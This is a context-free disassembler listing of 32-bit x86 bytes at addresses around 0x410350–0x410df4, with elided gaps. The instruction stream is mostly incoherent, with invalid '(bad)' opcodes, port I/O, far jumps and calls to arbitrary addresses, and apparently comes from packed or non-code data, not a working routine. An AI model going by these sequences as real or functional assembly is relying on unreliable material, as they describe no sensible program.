  410350:	cmp    eax,0xa58eb45b
  410355:	fldcw  WORD PTR [edi+edx*8]
  410358:	adc    esp,DWORD PTR [esi]
  41035a:	ret    
  41035b:	add    edx,DWORD PTR [ecx+esi*1]
  41035e:	inc    esi
  41035f:	push   eax
  410360:	inc    esi
  410361:	jae    0x4103b3
  410363:	push   ecx
  410364:	xchg   ecx,eax
  410365:	jge    0x4103c6
  410367:	inc    eax
  410368:	mov    dh,al
  41036a:	call   0x2640875a
  41036f:	fiadd  DWORD PTR [ebx+ebx*4-0x6c]
  410373:	cld    
	...
  41039c:	add    BYTE PTR [eax],al
  41039e:	add    ebx,esi
  4103a0:	call   0x80fd5ca8
  4103a5:	sbb    esp,ebx
  4103a7:	sbb    ebp,ecx
  4103a9:	xor    ebx,DWORD PTR [ecx+0x7]
  4103ac:	icebp  
  4103ad:	jmp    0x410380
  4103af:	mov    eax,0xd361d9f5
  4103b4:	outs   dx,DWORD PTR ds:[esi]
  4103b5:	fiadd  DWORD PTR [eax-0x2f]
  4103b8:	sbb    edi,DWORD PTR [ebx]
  4103ba:	xchg   BYTE PTR [edx],bl
  4103bc:	jmp    0x215f764d
  4103c1:	inc    ebx
  4103c2:	fisttp DWORD PTR ds:0x5116aa04
  4103c9:	dec    ebp
  4103ca:	pushf  
  4103cb:	sbb    ch,cl
  4103cd:	xor    BYTE PTR [esi],ah
  4103cf:	jnp    0x41041c
  4103d1:	add    al,0x3e
  4103d3:	push   eax
  4103d4:	test   eax,0x91252150
  4103d9:	bsr    edi,DWORD PTR [ebp+ebx*4+0x34]
  4103de:	pop    bx
  4103e0:	jmp    0xcf34afcd
  4103e5:	gs jg  0x410443
  4103e8:	sbb    ecx,ebx
  4103ea:	push   edx
  4103eb:	push   ebx
  4103ec:	xchg   ecx,eax
  4103ed:	inc    ebx
  4103ee:	pushf  
  4103ef:	jl     0x4103f0
  4103f1:	jne    0x4103cd
  4103f3:	adc    bh,BYTE PTR [ecx+0x6e]
  4103f6:	out    0x71,eax
  4103f8:	add    BYTE PTR [edi-0x2bffc143],ch
  4103fe:	xchg   ebx,eax
  4103ff:	push   ss
  410400:	cld    
  410401:	sbb    al,BYTE PTR [eax]
	...
  41042b:	add    BYTE PTR [edx-0x78b1013d],al
  410431:	jge    0x410424
  410433:	xchg   edi,eax
  410434:	cmp    dl,BYTE PTR [ebp+esi*2-0x7e]
  410438:	ja     0x410441
  41043a:	cld    
  41043b:	ss stc 
  41043d:	push   edx
  41043e:	call   0xfebcf0ca
  410443:	(bad)  
  410444:	aaa    
  410445:	xchg   edx,eax
  410446:	shl    ebp,0x3d
  410449:	mov    eax,DWORD PTR es:0xb7fb98c3
  410450:	cs icebp 
  410452:	call   DWORD PTR [edx-0xe8b83d6]
  410458:	gs push ss
  41045a:	jbe    0x410452
  41045c:	rol    WORD PTR [ebp+ebp*8-0x4e],cl
  410461:	inc    edi
  410462:	pop    ecx
  410463:	xor    DWORD PTR [ebp+0x5b],edi
  410466:	mov    ebx,DWORD PTR [ecx+ebp*2]
  410469:	adc    eax,DWORD PTR [ecx-0x17]
  41046c:	mov    ebp,0x6155003c
  410471:	repz pop ebp
  410473:	dec    ebx
  410474:	jge    0x4104d1
  410476:	push   edi
  410477:	rcr    DWORD PTR [edx+0x3ae8fff6],1
  41047d:	fwait
  41047e:	jae    0x41044e
  410480:	dec    edi
  410481:	jae    0x410439
  410483:	imul   edx,DWORD PTR [esi],0x7d
  410486:	dec    edi
  410487:	adc    DWORD PTR [edx],edi
  410489:	pop    ebx
  41048a:	out    dx,eax
  41048b:	push   edi
  41048c:	push   ebp
  41048d:	sub    esp,DWORD PTR [edx+0x28]
	...
  4104b8:	add    BYTE PTR [eax],al
  4104ba:	cmp    ch,BYTE PTR [ebx]
  4104bc:	inc    DWORD PTR [eax]
  4104be:	fimul  DWORD PTR [edi-0x18]
  4104c1:	ret    
  4104c2:	xchg   BYTE PTR [ebx+0x1fa3e8fd],ah
  4104c8:	(bad)  
  4104c9:	(bad)  
  4104ca:	mov    esp,0x61804658
  4104cf:	push   edi
  4104d0:	jne    0x4104cc
  4104d2:	fldenv [ebx-0x5d313fcf]
  4104d8:	std    
  4104d9:	push   eax
  4104db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104dc:	lods   al,BYTE PTR ds:[esi]
  4104dd:	cmp    BYTE PTR [eax-0x350044f4],ch
  4104e3:	mov    ds:0x6f9f75fd,eax
  4104e8:	es jbe 0x41053b
  4104eb:	mov    ds:0x962e5e5d,eax
  4104f0:	add    al,BYTE PTR [eax]
  4104f2:	stos   BYTE PTR es:[edi],al
  4104f3:	into   
  4104f4:	jmp    0xbd00:0x68a41b83
  4104fb:	xor    edi,edi
  4104fd:	jne    0x41054e
  4104ff:	outs   dx,DWORD PTR ds:[esi]
  410500:	enter  0x5075,0xa3
  410504:	xchg   DWORD PTR [ebp+0x53],eax
  410507:	out    dx,al
  410508:	jmp    FWORD PTR [ecx+0x57]
  41050b:	out    dx,eax
  41050c:	ins    DWORD PTR es:[edi],dx
  41050d:	bound  esp,QWORD PTR [esi+0x5f]
  410510:	push   0x805f2700
  410515:	call   0x401bc5
  41051a:	sbb    al,0x9f
  41051c:	jb     0x41053d
	...
  410546:	add    BYTE PTR [eax],al
  410548:	aaa    
  410549:	xchg   DWORD PTR [edx-0x7e],eax
  41054c:	rcl    BYTE PTR [edx+0x5f17684e],1
  410552:	out    dx,eax
  410553:	mov    esi,0x4161fc7f
  410558:	out    0x2e,eax
  41055a:	push   DWORD PTR [ebp-0x11]
  41055d:	xchg   BYTE PTR [esi-0x5f],cl
  410560:	ds rcl esi,1
  410563:	out    0x87,eax
  410565:	dec    esp
  410566:	xlat   BYTE PTR ds:[ebx]
  410567:	(bad)  
  410568:	fnstenv [edi-0x2a]
  41056b:	dec    BYTE PTR [ebx+0x6c]
  41056e:	jmp    0xfcc8:0xd6f153cb
  410575:	add    BYTE PTR [edx],0x55
  410578:	lds    edx,FWORD PTR [eax]
  41057a:	add    ebx,0xffffffb2
  41057d:	mov    es,WORD PTR [edx]
  41057f:	push   0x5b
  410581:	adc    DWORD PTR [ecx+0x8],edx
  410584:	xchg   esi,eax
  410585:	xchg   esp,eax
  410586:	dec    edi
  410587:	call   FWORD PTR [ecx+0x26fc40eb]
  41058d:	test   BYTE PTR [edx],al
  41058f:	out    dx,eax
  410590:	enter  0xa89c,0x61
  410594:	inc    DWORD PTR [ebx-0x3d234996]
  41059a:	add    bh,bh
  41059c:	jmp    0x410609
  41059e:	jmp    0xebfe:0xd7519f5a
  4105a5:	xlat   BYTE PTR ds:[bx]
  4105a7:	je     0x4105ef
  4105a9:	dec    esp
  4105aa:	jne    0x410620
	...
  4105d4:	add    BYTE PTR [eax],al
  4105d6:	push   ecx
  4105d7:	jns    0x4105a4
  4105d9:	rol    DWORD PTR [edx-0x7c],0x2f
  4105dd:	mov    edx,DWORD PTR [edx+0x5]
  4105e0:	sar    bl,0xa4
  4105e3:	test   BYTE PTR [eax+0x2e],ch
  4105e6:	xor    DWORD PTR [edi],ecx
  4105e8:	or     al,0xe8
  4105ea:	jae    0x410603
  4105ec:	xlat   BYTE PTR ds:[ebx]
  4105ed:	(bad)  
  4105ee:	mov    bh,0x3e
  4105f0:	fsub   DWORD PTR [edi+0x3e]
  4105f3:	test   ch,ah
  4105f5:	mov    ebp,0x4160c3a6
  4105fa:	ds sbb al,0xae
  4105fd:	popa   
  4105fe:	jg     0x410584
  410600:	aad    0x74
  410602:	inc    esi
  410603:	pop    ebx
  410604:	xchg   ecx,eax
  410605:	and    ebx,DWORD PTR [edi+0x3e6b9d79]
  41060b:	pop    ebx
  41060c:	xchg   BYTE PTR [ebp+0x450aa759],dl
  410612:	add    ebx,DWORD PTR ds:[edi+0x7e5b7f61]
  410619:	push   eax
  41061a:	ss sbb edi,0xffffffa4
  41061e:	sar    BYTE PTR [ecx+0x6d],0x50
  410622:	mov    edx,0xa60bdb79
  410627:	cmp    esp,edx
  410629:	(bad)  
  41062a:	test   al,0xa3
  41062c:	sub    bh,bh
  41062e:	mov    eax,ds:0xbce7620e
  410633:	sahf   
  410634:	inc    esp
  410635:	mov    ch,dl
  410637:	dec    edx
  410638:	jb     0x41062b
	...
  410662:	add    BYTE PTR [eax],al
  410664:	pop    ss
  410665:	pop    ebx
  410666:	fs inc eax
  410668:	or     BYTE PTR [edx],0x2e
  41066b:	push   eax
  41066c:	inc    esi
  41066d:	add    eax,0x4aead6e9
  410672:	push   ds
  410673:	xor    DWORD PTR [edx-0x20],ecx
  410676:	sub    BYTE PTR [eax+0x19],dl
  410679:	out    0xb3,al
  41067b:	xlat   BYTE PTR ds:[ebx]
  41067c:	leave  
  41067d:	add    al,0xe9
  41067f:	imul   edi,DWORD PTR [esi],0x3e01fe03
  410685:	pop    ebx
  410686:	test   BYTE PTR [edi+0x32],0x5
  41068a:	out    dx,al
  41068b:	aad    0xaf
  41068d:	pop    edi
  41068e:	push   ebx
  41068f:	add    al,0xa4
  410691:	pop    ebx
  410692:	sar    DWORD PTR [ebp+0x73e95b9f],1
  410698:	and    bh,ch
  41069a:	int3   
  41069b:	in     al,dx
  41069c:	fwait
  41069d:	cld    
  41069e:	call   0xecdf0da6
  4106a3:	add    esi,DWORD PTR [ebx-0x1c]
  4106a6:	inc    esp
  4106a8:	mov    edi,0x2962fb9c
  4106ad:	dec    edi
  4106ae:	mov    edi,ebx
  4106b0:	addr16 pop ebx
  4106b2:	lea    esp,[esi+eax*1]
  4106b5:	sub    edi,edi
  4106b7:	sbb    al,0x36
  4106b9:	js     0x41072f
  4106bb:	loope  0x410724
  4106bd:	pop    ebx
  4106be:	(bad)  
  4106bf:	cld    
  4106c0:	loope  0x41073b
  4106c2:	push   ecx
  4106c3:	ror    DWORD PTR [eax-0x48],1
  4106c6:	je     0x410696
	...
  4106f0:	add    BYTE PTR [eax],al
  4106f2:	mov    dh,0xf
  4106f4:	cld    
  4106f5:	pop    ecx
  4106f6:	and    al,0x5b
  4106f8:	push   0xffffffe9
  4106fa:	and    eax,0x3de90278
  4106ff:	js     0x410775
  410701:	stc    
  410702:	pop    ss
  410703:	js     0x410703
  410705:	fistp  DWORD PTR [ecx+0x3dd30002]
  41070b:	cmp    DWORD PTR [eax-0x35],0x3d
  41070f:	pop    ebx
  410710:	nop
  410711:	ss icebp 
  410713:	jbe    0x4106fc
  410715:	stc    
  410716:	ficomp WORD PTR [edx+0x0]
  410719:	xor    BYTE PTR [eax+ebp*2+0x0],bh
  41071d:	mov    ah,0xb6
  41071f:	test   BYTE PTR [edx-0x7cee3dd3],al
  410725:	mov    WORD PTR [ebp+0x78],ss
  410728:	jae    0x410716
  41072a:	or     ah,BYTE PTR [edx-0x1bc22a3f]
  410730:	push   esp
  410731:	fnsave [esi-0x2a5b72b6]
  410737:	daa    
  410738:	push   0xffffffe9
  41073a:	or     ch,bh
  41073c:	or     ebx,esi
  41073e:	js     0x4107a3
  410740:	push   0xffffffe9
  410742:	or     ch,bh
  410744:	adc    ecx,esi
  410746:	dec    edi
  410747:	jne    0x5269ee4d
  41074d:	(bad)  
  41074e:	(bad)  {k7}{z}
  410753:	pop    esp
  410754:	mov    edx,DWORD PTR [ebp+0x0]
	...
  41077f:	add    BYTE PTR [edi-0x1d],ch
  410782:	adc    BYTE PTR [ebp-0x72b12cde],cl
  410788:	and    bl,BYTE PTR [edi-0x711895b2]
  41078e:	jae    0x410748
  410790:	enter  0xc29,0x83
  410794:	cmp    dl,bl
  410796:	(bad)  
  410797:	jae    0x41079b
  410799:	loope  0x410816
  41079b:	ror    BYTE PTR [eax+0x29],0x14
  41079f:	push   DWORD PTR [edx+0x1837fd6b]
  4107a5:	sub    DWORD PTR [edi+edi*8],ecx
  4107a8:	xchg   edx,eax
  4107a9:	arpl   di,di
  4107ab:	push   ebp
  4107ac:	scas   eax,DWORD PTR es:[edi]
  4107ad:	mov    ?,WORD PTR ds:0xfffa67e8
  4107b3:	jmp    DWORD PTR [edi+esi*4]
  4107b6:	add    bh,bh
  4107b8:	fcmove st,st(7)
  4107ba:	jae    0x41079c
  4107bc:	cld    
  4107bd:	aam    0x89
  4107bf:	push   ebp
  4107c0:	out    dx,eax
  4107c1:	loop   0x4107d3
  4107c3:	call   edx
  4107c5:	sar    ebp,cl
  4107c7:	push   edx
  4107c8:	outs   dx,DWORD PTR ds:[esi]
  4107c9:	cs leave 
  4107cb:	ret    0x5b63
  4107ce:	push   ebp
  4107cf:	mov    ebx,DWORD PTR [ebx-0x27]
  4107d2:	ret    0x39f8
  4107d5:	(bad)  
  4107d6:	std    
  4107d7:	push   edi
  4107d8:	int3   
  4107d9:	dec    eax
  4107da:	adc    BYTE PTR [ebx-0x77c1f9b],cl
  4107e0:	sub    DWORD PTR [ebx+0x50fd],ecx
	...
  41080e:	lea    ebx,[edi-0x1]
  410811:	jne    0x410842
  410813:	sbb    DWORD PTR [eax],eax
  410815:	(bad)  
  410816:	ds pop ss
  410818:	hlt    
  410819:	(bad)  
  41081a:	ins    BYTE PTR es:[edi],dx
  41081b:	push   0xa8bbf89
  410820:	retf   
  410821:	test   BYTE PTR [edx],cl
  410823:	mov    bh,0xd2
  410825:	(bad)  
  410826:	test   BYTE PTR ds:[edx],al
  410829:	add    ch,al
  41082b:	bswap  esp
  41082d:	std    
  41082e:	icebp  
  41082f:	mov    ebp,0xffbb117e
  410834:	iret   
  410835:	std    
  410836:	loope  0x410805
  410838:	xor    ecx,DWORD PTR [ebp-0x12e7b3d]
  41083e:	rcl    DWORD PTR [esi+ebx*2+0x10],1
  410842:	leave  
  410843:	das    
  410844:	int3   
  410845:	std    
  410846:	shr    ebp,0xd2
  410849:	push   ecx
  41084a:	dec    edx
  41084b:	add    DWORD PTR [ecx-0x2d024f05],edx
  410851:	jmp    FWORD PTR ds:0x3ebc815f
  410857:	or     eax,0x8f99fed3
  41085c:	idiv   dh
  41085e:	or     edx,DWORD PTR [ecx+edx*8-0x2e32c58c]
  410865:	je     0x41089d
  410867:	sbb    al,0xb
  410869:	(bad)  
  41086a:	jns    0x4108b1
  41086c:	xchg   esi,eax
  41086e:	dec    esi
  41086f:	cmp    eax,0xfb81
	...
  41089c:	push   0x5d74d355
  4108a1:	pop    ecx
  4108a2:	stos   DWORD PTR es:[edi],eax
  4108a3:	mov    dh,BYTE PTR [ebx+0x51fed24c]
  4108a9:	jmp    0x5cd507a3
  4108ae:	sar    dh,cl
  4108b0:	inc    ecx
  4108b1:	ins    DWORD PTR es:[edi],dx
  4108b2:	xor    al,0x8
  4108b4:	cdq    
  4108b5:	cmp    eax,esi
  4108b7:	(bad)  
  4108b9:	pop    ebx
  4108ba:	cmp    al,0x7f
  4108bc:	adc    eax,0x23cba4dc
  4108c1:	jbe    0x410898
  4108c3:	cmp    al,ch
  4108c5:	paddusw mm7,QWORD PTR [esi+0x2f]
  4108c9:	call   0x764cd439
  4108ce:	mov    ebp,0x435b9433
  4108d3:	add    al,0xf9
  4108d5:	out    dx,eax
  4108d6:	(bad)  
  4108d8:	(bad)  
  4108d9:	xor    ebp,DWORD PTR [ebx+eax*8+0x72]
  4108dd:	stc    
  4108de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108df:	dec    eax
  4108e0:	loop   0x41093c
  4108e2:	jmp    0x620c46ea
  4108e7:	js     0x4108b2
  4108e9:	je     0x410870
  4108eb:	shl    BYTE PTR [eax+ecx*2+0xac2486c],cl
  4108f2:	mov    BYTE PTR fs:[ebp+0x1d26d74],dh
  4108f9:	add    ecx,edi
  4108fb:	shl    dl,cl
  4108fd:	jb     0x41095d
  4108ff:	rol    BYTE PTR [eax],cl
	...
  410929:	add    BYTE PTR [eax-0x3600458b],ah
  41092f:	fxch   st(3)
  410931:	iret   
  410932:	xchg   ecx,eax
  410933:	in     eax,0xbc
  410935:	es mov ebx,0x80d13cb7
  41093b:	jne    0x410995
  41093d:	shl    dl,cl
  41093f:	dec    edx
  410940:	cs pop eax
  410942:	inc    edx
  410943:	jbe    0x4108e0
  410945:	sti    
  410946:	adc    BYTE PTR [ebx+0x7560d2ea],al
  41094c:	imul   ecx,edx,0x400dcb49
  410952:	push   edx
  410953:	retf   0xe97b
  410956:	mov    ecx,0xaa7e4d81
  41095b:	jb     0x41095c
  41095d:	test   BYTE PTR [edi],0x76
  410960:	mov    bl,bl
  410962:	or     al,0xb0
  410964:	mul    edi
  410966:	pcmpeqd mm7,mm6
  410969:	cmp    esp,DWORD PTR [edx]
  41096b:	push   ss
  41096c:	leave  
  41096d:	stos   DWORD PTR es:[edi],eax
  41096e:	ds pop ebx
  410970:	push   ebp
  410971:	bound  ebx,QWORD PTR [esi]
  410973:	jbe    0x4109e9
  410975:	icebp  
  410976:	out    dx,al
  410977:	out    dx,eax
  410978:	pop    ss
  410979:	rcr    DWORD PTR [edx-0x17],1
  41097c:	(bad)  
  41097d:	mov    dh,0xf
  41097f:	lock or eax,ecx
  410982:	push   ecx
  410983:	cli    
  410984:	(bad)  
  410985:	call   0xa9c39e36
  41098a:	cmp    BYTE PTR [ebx],cl
  41098c:	call   FWORD PTR [eax+eax*1]
	...
  4109b7:	add    BYTE PTR [esi],bh
  4109b9:	je     0x410a2f
  4109bb:	icebp  
  4109bc:	cmc    
  4109bd:	aaa    
  4109be:	jb     0x410946
  4109c0:	out    dx,eax
  4109c1:	jne    0x410a37
  4109c3:	aad    0xee
  4109c5:	out    dx,eax
  4109c6:	pcmpeqd mm2,QWORD PTR [ecx]
  4109c9:	push   ebx
  4109ca:	call   0xfeb5158d
  4109cf:	xor    BYTE PTR [eax+0x22b40048],al
  4109d5:	cmp    dh,0xdc
  4109d8:	xchg   ebp,eax
  4109d9:	jne    0x410a4f
  4109db:	icebp  
  4109dc:	jne    0x410a5b
  4109de:	jo     0x410a26
  4109e0:	outs   dx,DWORD PTR ds:[esi]
  4109e1:	jne    0x410a57
  4109e3:	in     eax,dx
  4109e4:	gs pop eax
  4109e6:	pusha  
  4109e7:	jmp    0x2e912529
  4109ec:	or     DWORD PTR [edi-0x1],esp
  4109ef:	pushf  
  4109f0:	push   ebp
  4109f1:	jl     0x4109fa
  4109f3:	fwait
  4109f4:	mov    ?,WORD PTR [ebp-0x2]
  4109f7:	pushf  
  4109f8:	push   ecx
  4109f9:	jne    0x410a6f
  4109fb:	stc    
  4109fc:	outs   dx,BYTE PTR ds:[esi]
  4109fd:	out    dx,eax
  4109fe:	pop    ss
  4109ff:	add    BYTE PTR [edi],ch
  410a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a02:	outs   dx,DWORD PTR ds:[esi]
  410a03:	inc    DWORD PTR [eax-0x4f]
  410a06:	rcl    BYTE PTR [edi+eiz*1],0x2d
  410a0a:	mov    ebp,esp
  410a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a0d:	mov    ds:0x8b20f7d2,eax
  410a12:	std    
  410a13:	jne    0x410a54
  410a15:	hlt    
  410a16:	add    DWORD PTR [eax],0xfffffff3
  410a19:	mov    bh,ch
  410a1b:	push   eax
	...
  410a44:	add    BYTE PTR [eax],al
  410a46:	add    BYTE PTR ds:0xa508e808,cl
  410a4c:	std    
  410a4d:	jmp    FWORD PTR [ebp+0x5f]
  410a50:	push   0x0
  410a52:	jg     0x4109de
  410a54:	add    DWORD PTR [eax],eax
  410a56:	out    0xf4,eax
  410a58:	add    DWORD PTR [eax],0xffffff9f
  410a5b:	mov    bh,ch
  410a5d:	push   eax
  410a5e:	dec    ebp
  410a5f:	mov    bh,ch
  410a61:	jne    0x410a3a
  410a63:	adc    eax,0x8fe76a00
  410a68:	sbb    al,0x60
  410a6a:	xlat   BYTE PTR ds:[ebx]
  410a6b:	push   edi
  410a6c:	mov    DWORD PTR [ebp-0x26cb9],0x5797
  410a76:	fcomp  st(4)
  410a78:	repnz mul DWORD PTR [eax]
  410a7b:	mov    eax,DWORD PTR [eax]
  410a7d:	add    BYTE PTR [edi-0x107a38a9],dl
  410a83:	xchg   edx,eax
  410a84:	std    
  410a85:	jmp    DWORD PTR [edi+0x58000057]
  410a8b:	(bad)  
  410a8d:	test   DWORD PTR [eax-0x75],0x5767fffe
  410a94:	mov    edx,DWORD PTR [ebp-0x71]
  410a97:	not    BYTE PTR [eax]
  410a99:	push   0x57
  410a9b:	hlt    
  410a9c:	xor    eax,0x48
  410a9f:	mov    edi,ebp
  410aa1:	push   eax
  410aa2:	inc    DWORD PTR ds:[ebp-0x2f9bb615]
  410aa9:	dec    edi
	...
  410ad2:	add    BYTE PTR [eax],al
  410ad4:	mov    ebx,0x41f6db06
  410ad9:	je     0x410b0c
  410adb:	push   DWORD PTR [ebx+0x4274cf94]
  410ae1:	adc    DWORD PTR [eax+ecx*1-0x6c],0x4674cd84
  410ae9:	xchg   ecx,eax
  410aea:	xor    DWORD PTR [ebp+edi*4-0x39],eax
  410aee:	fcomi  st,st(6)
  410af0:	adc    DWORD PTR [edx+0x78c20f03],esp
  410af6:	add    eax,DWORD PTR [eax]
  410af8:	ds add eax,0xa9f1eb91
  410afe:	into   
  410aff:	inc    DWORD PTR [eax-0x8]
  410b02:	inc    BYTE PTR [eax]
  410b04:	ds test ch,al
  410b07:	test   BYTE PTR [edx],cl
  410b09:	retf   0xfece
  410b0c:	ds test ch,bl
  410b0f:	mov    ebp,0x4161d766
  410b14:	ds out 0x88,eax
  410b17:	inc    ebp
  410b19:	icebp  
  410b1a:	into   
  410b1b:	dec    edi
  410b1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b1d:	shr    BYTE PTR [esi],0x0
  410b20:	ds test ebx,0x8940fc73
  410b27:	shr    DWORD PTR [ecx+0x3e00cf11],cl
  410b2d:	sbb    DWORD PTR [esi+0x43a68967],ecx
  410b33:	add    BYTE PTR [ebx+0xfc03ff],bh
	...
  410b61:	add    BYTE PTR [ecx-0x5c17cbcf],al
  410b67:	leave  
  410b68:	add    al,BYTE PTR [eax]
  410b6a:	mov    ebx,0x81235844
  410b6f:	pop    ebx
  410b70:	ins    BYTE PTR es:[edi],dx
  410b71:	mov    eax,0x21d7268
  410b76:	adc    BYTE PTR ds:[esi+0x5c],0x41
  410b7b:	(bad)  
  410b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b7d:	add    edi,DWORD PTR [ebx+0x40cfe8d8]
  410b83:	jb     0x410b1d
  410b85:	fcmovnb st,st(3)
  410b87:	adc    ecx,ebp
  410b89:	add    edi,DWORD PTR [ebx-0x23772266]
  410b8f:	pop    edx
  410b90:	jmp    0x4a7fa198
  410b95:	inc    ebp
  410b96:	ds loopne 0x410c04
  410b99:	add    edx,DWORD PTR [esi]
  410b9b:	jb     0x410b6a
  410b9d:	xor    edx,DWORD PTR [esi]
  410b9f:	add    al,0x49
  410ba1:	add    al,0x3e
  410ba3:	test   ax,0x6f57
  410ba7:	fdivrp st(3),st
  410ba9:	sahf   
  410baa:	test   BYTE PTR [ecx+ebp*8],bl
  410bad:	add    edi,DWORD PTR [ecx]
  410baf:	xlat   BYTE PTR ds:[ebx]
  410bb0:	add    edi,DWORD PTR ds:0x9e5b
  410bb5:	cwde   
  410bb6:	loope  0x410c21
  410bb8:	xchg   ebp,eax
  410bb9:	into   
  410bba:	rcl    bh,0x88
  410bbd:	(bad)  
  410bbe:	enter  0x8571,0x98
  410bc2:	aad    0x69
  410bc4:	jge    0x410b94
	...
  410bee:	add    BYTE PTR [eax],al
  410bf0:	enter  0x8cd7,0xd6
  410bf4:	mov    al,0x71
  410bf6:	pop    ebx
  410bf7:	mov    BYTE PTR [ecx-0xe319a97],dl
  410bfd:	add    al,0xe8
  410bff:	pop    ecx
  410c00:	ds add eax,0x53e59e9
  410c06:	jmp    0x3dbbce8b
  410c0b:	into   
  410c0c:	or     BYTE PTR [edx],0x3e
  410c0f:	clc    
  410c10:	test   al,0x25
  410c12:	add    BYTE PTR [eax-0x4a3f99c3],ch
  410c18:	add    BYTE PTR [edx+0x74],dh
  410c1b:	std    
  410c1c:	jo     0x410bc4
  410c1e:	xlat   BYTE PTR ds:[ebx]
  410c1f:	push   ss
  410c20:	mov    BYTE PTR [eax-0x2],dh
  410c23:	pop    esp
  410c24:	mov    eax,ds:0x780efe68
  410c29:	out    0xf,al
  410c2b:	push   es
  410c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c2d:	(bad)  
  410c2e:	idiv   dh
  410c30:	or     edi,DWORD PTR [ecx+0xf]
  410c33:	test   DWORD PTR [ebx],0xd934fe72
  410c39:	imul   edi,esi,0x5e0302e6
  410c3f:	jmp    0xd65d9081
  410c44:	imul   eax,DWORD PTR [edi-0x1],0xfe69ea94
  410c4b:	(bad)  
  410c4c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c4e:	jmp    0x410c06
  410c50:	or     esi,DWORD PTR [edx-0x2]
  410c53:	cmp    al,0x0
	...
  410c7d:	add    dl,ch
  410c7f:	jno    0x410c35
  410c81:	xchg   ebp,eax
  410c82:	adc    esi,DWORD PTR [edx-0x2]
  410c85:	xchg   ecx,eax
  410c86:	fsubr  DWORD PTR [edi-0x2]
  410c89:	sahf   
  410c8a:	or     ebp,DWORD PTR [eax+0x72039eeb]
  410c90:	out    0x9,eax
  410c92:	sbb    ebx,DWORD PTR [ebx+0x0]
  410c95:	mov    al,0xfc
  410c97:	dec    esp
  410c98:	add    BYTE PTR [edi+esi*1],dl
  410c9b:	test   BYTE PTR [edx-0xf93553],al
  410ca1:	hlt    
  410ca2:	test   eax,0x3dc60a78
  410ca7:	pop    ebx
  410ca8:	or     ebp,DWORD PTR [ecx]
  410caa:	icebp  
  410cab:	push   ebp
  410cac:	pop    esi
  410cad:	and    BYTE PTR [esp+eiz*2+0x0],bh
  410cb1:	cmp    BYTE PTR [edx-0x6aff4023],ah
  410cb7:	repz into 
  410cb9:	lea    esp,[edx+0x28524e90]
  410cbf:	or     BYTE PTR [eax+ebp*8],cl
  410cc2:	dec    esi
  410cc3:	lock std 
  410cc5:	dec    DWORD PTR [ebp+esi*4-0x6decb279]
  410ccc:	or     BYTE PTR [esi],dh
  410cce:	pop    eax
  410ccf:	mov    BYTE PTR [edx+0x29],0x4b
  410cd3:	pop    ebp
  410cd4:	inc    ebp
  410cd5:	aam    0x96
  410cd7:	fcomi  st,st(7)
  410cd9:	adc    al,0xb5
  410cdb:	lea    ebp,[ecx]
  410cdd:	neg    BYTE PTR [esi+0xebd008]
	...
  410d0b:	add    bh,bh
  410d0d:	inc    ebp
  410d0e:	movzx  edx,BYTE PTR [ebx+0x51]
  410d12:	in     al,dx
  410d13:	push   eax
  410d14:	outs   dx,DWORD PTR ds:[esi]
  410d15:	arpl   WORD PTR ds:[ecx+0x27],ax
  410d19:	icebp  
  410d1a:	inc    ebx
  410d1b:	fadd   DWORD PTR [edi-0x71]
  410d1e:	push   cs
  410d1f:	pop    edi
  410d20:	pop    ss
  410d21:	pop    esp
  410d22:	add    esp,0xffffffeb
  410d25:	lock inc ebx
  410d27:	fcom   DWORD PTR [edi-0x62]
  410d2a:	jae    0x410cfc
  410d2c:	inc    ecx
  410d2e:	je     0x410d2f
  410d30:	cwde   
  410d31:	hlt    
  410d32:	inc    ebx
  410d33:	shl    BYTE PTR [ecx],1
  410d35:	(bad)  
  410d37:	adc    al,0x35
  410d39:	stos   BYTE PTR es:[edi],al
  410d3a:	jg     0x410da1
  410d3c:	xchg   ebx,eax
  410d3d:	sahf   
  410d3e:	(bad)  
  410d3f:	call   edi
  410d41:	sahf   
  410d42:	jae    0x410d18
  410d44:	dec    edi
  410d45:	arpl   WORD PTR ds:[ecx-0x59],ax
  410d49:	lock inc ebx
  410d4b:	fadd   DWORD PTR [edi-0x71]
  410d4e:	ficomp WORD PTR [esi-0x69]
  410d51:	pop    ebx
  410d52:	add    esp,0xffffffab
  410d55:	lock inc ebx
  410d57:	fdivr  DWORD PTR [esi]
  410d59:	mov    dl,0xcb
  410d5b:	je     0x410dcb
  410d5d:	sbb    DWORD PTR [ecx+0x7a188175],ebx
  410d63:	inc    esp
  410d64:	mov    ?,esi
  410d66:	inc    ebp
  410d67:	int3   
  410d68:	push   cs
  410d69:	sub    DWORD PTR [esi-0x30],edx
  410d6c:	(bad)  
  410d6d:	xchg   ebp,eax
  410d6e:	pop    edi
  410d6f:	inc    ecx
	...
  410d98:	add    BYTE PTR [eax],al
  410d9a:	cmp    DWORD PTR ds:[esi],edx
  410d9d:	aad    0x6
  410d9f:	ret    
  410da0:	add    ch,al
  410da2:	mov    ecx,esi
  410da4:	retf   
  410da5:	(bad)  
  410da6:	xor    eax,0xa983fc42
  410dab:	add    DWORD PTR [edx],0xbab7c700
  410db1:	xor    BYTE PTR [ebx-0x3df0fcc8],0x2
  410db8:	add    eax,DWORD PTR [eax]
  410dba:	ds jne 0x410e0d
  410dbd:	or     al,0x26
  410dbf:	aaa    
  410dc0:	sub    al,BYTE PTR [eax]
  410dc2:	ds mov bl,0xe3
  410dc5:	cmp    dh,0x82
  410dc8:	jnp    0x410e0e
  410dca:	into   
  410dcb:	xchg   ebp,eax
  410dcc:	push   eax
  410dcd:	or     al,0xc9
  410dcf:	aaa    
  410dd0:	nop
  410dd1:	(bad)  
  410dd2:	imul   edi,DWORD PTR [eax-0x4201bb86],0x50
  410dd9:	enter  0x3fb1,0xc0
  410ddd:	mov    BYTE PTR [ebx+0x3e000410],0x84
  410de4:	test   DWORD PTR [ecx+ebx*4],edi
  410de7:	cmp    DWORD PTR [ebp+0x0],eax
  410dea:	ds jo  0x410e1f
  410ded:	lea    eax,[ebx]
  410def:	sbb    al,0x34
  410df1:	push   0x3f
  410df3:	pop    edx
  410df4:	add    al,0x6a
